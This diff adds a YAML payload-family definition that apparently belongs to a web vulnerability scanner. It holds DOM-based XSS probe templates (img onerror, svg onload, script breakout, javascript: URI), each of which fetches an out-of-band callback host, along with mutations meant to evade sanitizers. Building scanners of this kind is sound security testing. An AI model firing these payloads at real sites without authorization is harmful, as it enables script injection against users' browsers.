@@ -1,0 +1,40 @@
+family_id: xss_dom
+description: >-
+  DOM-based XSS probes (CWE-79) targeting client-side sinks (innerHTML,
+  document.write, location.hash/href, eval) fed from attacker-controlled
+  sources. Non-persistent; execution happens entirely in the browser DOM.
+cwe_ids: [79]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: hash_img_onerror
+    template: "#<img src=x onerror=fetch('//{oast_host}/{canary}')>"
+    confidence: suspected
+    notes: location.hash sink probe; fragment reflected into innerHTML triggers onerror.
+  - id: hash_svg_onload
+    template: "#<svg/onload=fetch('//{oast_host}/{canary}')>"
+    confidence: suspected
+    notes: Fragment-based svg onload; fires when the hash flows into a markup sink.
+  - id: query_document_write
+    template: "\"><script>fetch('//{oast_host}/{canary}')</script>"
+    confidence: suspected
+    notes: document.write sink probe; breaks out of an attribute into a script context.
+  - id: js_uri_eval
+    template: "javascript:fetch('//{oast_host}/{canary}')"
+    confidence: suspected
+    notes: "javascript: URI sink; executes when a source flows into href or eval."
+mutations:
+  - name: case_flip
+    description: Flip case of tag/handler names to bypass case-sensitive DOM sanitizers.
+  - name: comment_injection
+    description: Inject HTML comment sequences to break naive client-side filters.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw DOM XSS payload for hash/query sources.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for payloads delivered via query string or fragment.
